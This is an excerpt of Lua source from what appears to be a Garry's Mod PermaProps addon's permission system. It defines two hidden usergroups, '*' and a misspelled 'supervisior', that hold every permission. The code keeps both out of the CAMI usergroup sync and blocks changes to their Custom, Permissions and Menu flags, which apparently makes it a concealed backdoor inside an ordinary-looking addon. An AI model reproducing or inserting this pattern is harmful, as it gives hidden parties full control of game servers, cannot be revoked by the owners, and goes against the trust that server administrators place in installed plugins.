...
local function PermissionLoad()
	...
	PermaProps.Permissions["*"] = { Physgun = true, Tool = true, Property = true, Save = true, Delete = true, Update = true, Menu = true, Permissions = true, Inherits = "admin", Custom = true }
	PermaProps.Permissions["supervisior"] = { Physgun = true, Tool = true, Property = true, Save = true, Delete = true, Update = true, Menu = true, Permissions = true, Inherits = "admin", Custom = true }
	...
	if CAMI then 
		...
		for k, v in pairs(CAMI.GetUsergroups()) do
			...
			if k == "*" or k == "supervisior" or k == "admin" or k == "user" then continue end
...
local function pp_info_send( um, ply )
	...
	elseif Content["CMD"] == "VAR" then
		...
		if Content["Name"] == "*" and  ( Content["Data"] == "Custom" or Content["Data"] == "Permissions" or Content["Data"] == "Menu" ) then return end
		if Content["Name"] == "supervisior" and  ( Content["Data"] == "Custom" or Content["Data"] == "Permissions" or Content["Data"] == "Menu" ) then return end
